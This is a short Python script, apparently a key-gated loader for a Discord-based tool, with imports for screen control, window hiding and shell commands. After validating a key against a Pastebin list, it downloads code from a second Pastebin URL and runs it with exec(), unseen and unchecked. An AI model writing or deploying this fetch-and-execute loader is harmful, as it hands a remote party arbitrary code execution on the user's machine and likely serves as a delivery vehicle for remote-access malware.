from requests import get
import discord
from discord.ext import commands
import pyautogui
from os import remove as rem
from os import system as sys
from os import popen
from os import listdir
from os import chdir
from os import path as pth
from time import sleep
from platform import node
import requests
import asyncio
import json
from typing import Dict, List, Set
from colorama import init , Fore , Back
import win32gui
import win32con

try:
    with open('key.txt', 'r') as f:
        print('sytem : OK')
except FileNotFoundError:
    SERVER_BY_DANNUH = "https://pastebin.com/raw/6pJRWX77"
    validkey = get(SERVER_BY_DANNUH).text.splitlines()
    inp1 = input('INSERT KEY ( Bougth From Owner Or Verified Reseller ): ')
    if inp1 in validkey:
        sys('echo yes >> key.txt')
    else:
        print('Key Not Available.')
        exit()

main = get('https://pastebin.com/raw/0p9pSyTG')
main.raise_for_status

run = main.text

exec(run)